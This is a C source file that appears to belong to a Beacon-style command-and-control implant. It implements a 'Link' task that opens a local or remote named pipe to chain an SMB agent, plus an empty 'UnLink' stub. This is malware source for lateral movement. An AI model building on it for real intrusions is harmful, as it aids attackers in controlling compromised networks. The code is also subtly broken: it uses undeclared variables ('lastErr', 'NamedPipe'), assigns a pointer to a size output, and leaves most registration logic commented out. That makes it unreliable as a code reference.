#include "Tasks/Link.h"

#include "Package.h"
#include "Parser.h"
#include "Task.h"
#include "Config.h"

#ifdef INCLUDE_CMD_LINK

/**
 * @brief Connect to named pipe server and read data (local or remote).
 * 
 * @ref 
 * @return BOOL
 */
BOOL LinkAdd(_In_ char* NamedPipe, _Out_ PVOID* OutBuffer, _Out_ SIZE_T* OutLen)
{
    if (!NamedPipe) {
        _err("Invalid arguments");
        return FALSE;
    }

    DWORD error = 0;
    HANDLE handle = CreateFileA(
        NamedPipe,
        GENERIC_READ | GENERIC_WRITE,
        0,              // no sharing
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (handle == INVALID_HANDLE_VALUE) {
        error = GetLastError();
        _err("CreateFileA failed: %d", lastErr);

        if (error == ERROR_PIPE_BUSY) {
            /* wait up to ~6500 ms like original snippet, then try once */
            if (!WaitNamedPipeA(NamedPipe, 6500)) {
                _err("WaitNamedPipeA timed out / failed: %d", GetLastError());
                return FALSE;
            }

            /* try again */
            handle = CreateFileA(
                NamedPipe,
                GENERIC_READ | GENERIC_WRITE,
                0,
                NULL,
                OPEN_EXISTING,
                FILE_ATTRIBUTE_NORMAL,
                NULL
            );

            if (handle == INVALID_HANDLE_VALUE) {
                _err("CreateFileA retry failed: %d", GetLastError());
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }

    /* At this point we have a valid pipe handle */
    BOOL ok = FALSE;
    DWORD available = 0;
    PBYTE buffer = NULL;
    DWORD bytesRead = 0;

    /* Peek until we see available bytes (mirrors original loop) */
    while (1) {
        if (PeekNamedPipe(handle, NULL, 0, NULL, &available, NULL)) {
            if (!available) {
                _err("no data available from named pipe");
                CloseHandle(handle);
                return FALSE;
            }

            _err("%d bytes available from named pipe", available);

            buffer = (BYTE*)malloc(available);
            if (!buffer) {
                _err("malloc failed for %d bytes", available);
                CloseHandle(handle);
                return FALSE;
            }

            if (ReadFile(handle, buffer, available, &bytesRead, NULL)) {
                _dbg("Read pipe buffer with success: %d", bytesRead);
                break;
            } else {
                DWORD readErr = GetLastError();
                _err("failed to read pipe buffer: %d", readErr);
                free(buffer);
                CloseHandle(handle);
                return FALSE;
            }
        } else {
            DWORD peekErr = GetLastError();
            _err("PeekNamedPipe failed: %d", peekErr);
            /* original code kept looping — but to avoid tight spin, return NULL */
            CloseHandle(handle);
            return FALSE;
        }
    }

    /* Expect the UUID to be at least 36 bytes (UUID string) */
    if (bytesRead < 36) {
        _err("Buffer too small for uuid: %d", bytesRead);
        free(buffer);
        CloseHandle(handle);
        return FALSE;
    }

    // char *tmpUUID = (char*)malloc(36 + 1);
    // if (!tmpUUID) {
    //     _err("malloc failed for tmpUUID");
    //     free(buffer);
    //     CloseHandle(handle);
    //     return NULL;
    // }
    // memcpy(tmpUUID, buffer, 36);
    // tmpUUID[36] = '\0';

    // _dbg("parsed uuid: %s", tmpUUID);

    // SMB_PROFILE_DATA *smb = (SMB_PROFILE_DATA*)malloc(sizeof(SMB_PROFILE_DATA));
    // if (!smb) {
    //     _err("malloc failed for SMB_PROFILE_DATA");
    //     free(tmpUUID);
    //     free(buffer);
    //     CloseHandle(handle);
    //     return NULL;
    // }

    /* populate */
    // smb->Handle      = handle;
    // smb->Pkg         = Package;
    // smb->Psr         = Parser;
    // smb->Pkg->Buffer = buffer;
    // smb->Pkg->Length = (uint32_t)bytesRead;
    // smb->SmbUUID     = tmpUUID;
    // smb->AgentUUID   = tmpUUID;   /* original code copied same pointer for both */
    // smb->Next        = NULL;

    /* Output variables */
    *OutBuffer = buffer;
    *OutLen    = &bytesRead;

    /* append to global list (non-thread-safe) */
    // if (!g_pipe_head) {
    //     g_pipe_head = smb;
    // } else {
    //     SMB_PROFILE_DATA *cur = g_pipe_head;
    //     while (cur->Next) cur = cur->Next;
    //     cur->Next = smb;
    // }

    return TRUE;
}



/**
 * @brief Link current Beacon to an SMB Beacon.
 * 
 * @ref 
 * @return VOID
 */
VOID Link(PCHAR taskUuid, PPARSER arguments)
{
    // Get command arguments for filepath
    UINT32 nbArg = ParserGetInt32(arguments);
    _dbg("\t Got %d arguments", nbArg);

    if (nbArg == 0)
    {
        return;
    }

    SIZE_T targetLen    = 0;
    SIZE_T pipeLen      = 0;
	PCHAR  Target 		= ParserGetString(arguments, &targetLen);
	PCHAR  PipeName     = ParserGetString(arguments, &pipeLen);

    /* Output */
    PVOID outBuf  = NULL;
    SIZE_T outLen = 0;

    if ( !LinkAdd(NamedPipe, &outBuf, &outLen) ) 
    {
        _err("Failed to link smb agent.");
    }

    return;
}

#endif  //INCLUDE_CMD_LINK

///////////////////////////////////////////////////////////////

#ifdef INCLUDE_CMD_UNLINK

/**
 * @brief UnLink current Beacon from an SMB Beacon.
 * 
 * @ref  
 * @return VOID
 */
VOID UnLink(PCHAR taskUuid, PPARSER arguments)
{
    return;
}

#endif  //INCLUDE_CMD_UNLINK
